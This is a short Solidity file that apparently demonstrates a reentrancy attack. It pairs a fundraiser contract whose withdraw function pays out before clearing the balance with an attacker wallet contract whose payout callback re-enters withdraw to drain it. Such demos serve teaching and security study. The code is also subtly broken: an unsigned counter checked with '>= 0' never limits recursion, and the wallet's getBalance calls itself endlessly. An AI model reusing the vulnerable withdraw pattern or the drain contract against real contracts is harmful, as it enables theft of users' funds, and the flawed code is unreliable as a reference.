pragma solidity ^0.4.21;

contract VulnerableFundraiser {
    mapping(address => uint) balances;
    
    //Vulnerable!!!!
    function withdrawAllMyCoins() {
        uint withdrawAmount = balances[msg.sender];
        MalicousWallet wallet = MalicousWallet(msg.sender);
        wallet.payout.value(withdrawAmount)();
        
        balances[msg.sender] = 0;
    }
    
    function getBalance() constant returns (uint) {
        return this.balance;
    }
    
    function contribute() payable {
        balances[msg.sender] += msg.value;
    }
    
    function() payable {
    }
    
}


contract MalicousWallet {
    
    VulnerableFundraiser fundRaiser;
    uint recursion = 10;
    
    function MalicousWallet(address fundRaiserAddress) {
        fundRaiser = VulnerableFundraiser(fundRaiserAddress); 
    }
    
    function contribute(uint amount) {
        fundRaiser.contribute.value(amount)();
    }
    
    function withdraw() {
        fundRaiser.withdrawAllMyCoins();
    }
    
    function getBalance() constant returns(uint) {
        return this.getBalance();
    }
    
    function payout() payable {
        // Recursive re entrant attack !
        if (recursion >= 0) {
            recursion--;
            fundRaiser.withdrawAllMyCoins();
        }
    }
    
    function() payable {
        
    }
}

